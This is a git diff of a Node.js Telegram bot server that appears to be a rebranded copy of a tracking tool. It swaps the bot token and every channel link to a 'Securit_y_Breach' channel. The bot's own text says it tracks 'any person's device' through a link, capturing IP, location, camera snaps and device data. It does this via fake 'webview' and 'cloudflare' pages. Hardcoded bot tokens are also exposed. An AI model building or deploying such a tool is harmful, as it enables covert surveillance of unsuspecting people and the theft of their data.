@@ -4,10 +4,10 @@ var cors = require('cors');
 var bodyParser = require('body-parser');
 const fetch = require('node-fetch');
 const TelegramBot = require('node-telegram-bot-api');
-const bot = new TelegramBot('6908042604:AAFfO9vaVSB_8PXA2I4Pxfpr-WNHRA7I1uA', {polling: true});
+const bot = new TelegramBot('5709184979:AAGrCBeYhc-RO1T_StVb4hxpnoMu7aCaCWI', {polling: true});
 var jsonParser=bodyParser.json({limit:1024*1024*20, type:'application/json'});
 var urlencodedParser=bodyParser.urlencoded({ extended:true,limit:1024*1024*20,type:'application/x-www-form-urlencoded' });
-const channels = ['@RenusHackingArmy', '@RenusBotsChannel'];
+const channels = ['@Securit_y_Breach', '@Securit_y_Breach'];
 
 const app = express();
 app.use(jsonParser);
@@ -32,7 +32,7 @@ if(req.params.path != null){
 res.render("webview",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
 } 
 else{
-res.redirect("https://t.me/RenusHackingArmy");
+res.redirect("https://t.me/Securit_y_Breach");
 }
 
          
@@ -50,7 +50,7 @@ if(req.params.path != null){
 res.render("cloudflare",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
 } 
 else{
-res.redirect("https://t.me/RenusHackingArmy");
+res.redirect("https://t.me/Securit_y_Breach");
 }
 
          
@@ -90,8 +90,8 @@ if (msg.text == "/start") {
       var joinMessage = `Welcome ${msg.chat.first_name} ! You can use this bot to track any person's device just through a simple link. It can gather information like IP address, location, camera snaps, battery level, network info, and a wide range of information about their device, plus many more benefits.\n\nHey user, you have to join both these channels. Otherwise, this bot will not work. If you have joined both channels, then tap the "JOINED" button below to confirm your membership.`;
 
 const joinButtons = [
-  [{ text: 'JOIN CHANNEL', url: 'https://t.me/RenusHackingArmy' },
-  { text: 'JOIN CHANNEL', url: 'https://t.me/RenusBotsChannel' }], 
+  [{ text: 'JOIN CHANNEL', url: 'https://t.me/Securit_y_Breach' },
+  { text: 'JOIN CHANNEL', url: 'https://t.me/Securit_y_Breach' }], 
   [{ text: 'JOINED', callback_data: 'joined' }]
 ];
 
@@ -209,7 +209,7 @@ var m = {
         reply_markup: JSON.stringify({
           "inline_keyboard": [
           [{ text: "Create Link", callback_data: "crenew" }],
-           [{ text: "Help Support", url: "https://t.me/RenusBotsGroup" }]
+           [{ text: "Help Support", url: "https://t.me/Securit_y_Breach" }]
       ]
         })
       };
@@ -240,8 +240,8 @@ async function handleStartCommand(chatId) {
             var joinMes = `Hey user if you want to use this bot. So you have to join both these channels. otherwise this bot will not work. If you have joined both the channels. Then tap the "JOINED" button below to confirm your membership. If you are thinking that without joining I will use the bot. So you are wasting your time.`;
 
 const joinButtons = [
-  [{ text: 'JOIN CHANNEL', url: 'https://t.me/RenusHackingArmy' },
-  { text: 'JOIN CHANNEL', url: 'https://t.me/RenusBotsChannel' }], 
+  [{ text: 'JOIN CHANNEL', url: 'https://t.me/Securit_y_Breach' },
+  { text: 'JOIN CHANNEL', url: 'https://t.me/Securit_y_Breach' }], 
   [{ text: 'JOINED', callback_data: 'joined' }]
 ];
 
